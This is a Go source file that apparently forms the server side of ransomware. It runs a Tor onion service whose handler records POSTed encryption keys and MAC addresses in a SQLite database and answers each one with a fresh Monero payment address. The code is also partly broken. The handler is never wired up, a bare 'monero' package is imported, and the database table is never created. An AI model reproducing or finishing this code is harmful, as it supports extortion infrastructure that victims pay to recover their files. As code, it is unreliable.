package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"time"

	"github.com/cretz/bine/process/embedded"
	"github.com/cretz/bine/tor"

	"database/sql"
	"monero"

	_ "github.com/mattn/go-sqlite3"
)

func main() {
	if err := run(); err != nil {
		log.Fatal(err)
	}
}

func run() error {
	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")
	t, err := tor.Start(nil, &tor.StartConf{ProcessCreator: embedded.NewCreator()})
	if err != nil {
		log.Panicf("Unable to start Tor: %v", err)
	}
	defer t.Close()
	// Wait at most a few minutes to publish the service
	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer listenCancel()
	// Create a v3 onion service to listen on any port but show as 80
	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, RemotePorts: []int{80}})
	if err != nil {
		log.Panicf("Unable to create onion service: %v", err)
	}
	defer onion.Close()
	fmt.Printf("Open Tor browser and navigate to http://%v.onion\n", onion.ID)
	fmt.Println("Press enter to exit")
	// Serve the current folder from HTTP
	errCh := make(chan error, 1)
	go func() { errCh <- http.Serve(onion, http.FileServer(http.Dir("."))) }()
	// End when enter is pressed
	go func() {
		fmt.Scanln()
		errCh <- nil
	}()
	if err = <-errCh; err != nil {
		log.Panicf("Failed serving: %v", err)
	}

	return err
}

func listener(w http.ResponseWriter, r *http.Request) {

	switch r.Method {
	case "POST":
		if err := r.ParseForm(); err != nil {
			fmt.Fprintf(w, "ParseForm() err: %v", err)
			return
		}

		key := r.PostFormValue("key")

		mac := r.PostFormValue("mac")

		fmt.Println(key)

		writeDatabase(key, mac)

		moneroKey := monero.NewKey()

		fmt.Fprintf(w, "Key: %v\n", moneroKey.Address())

	default:
		fmt.Fprintf(w, "Tssss")
	}
}

func writeDatabase(key string, mac string) { // Add error management

	db, err := sql.Open("sqlite3", "./key.db")
	checkErr(err)

	statement, err := db.Prepare("INSERT INTO keys(timestamp, key, mac) values(?,?,?)")
	checkErr(err)

	statement.Exec(fmt.Sprint(time.Now().Unix()), key, mac)
	db.Close()

}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}
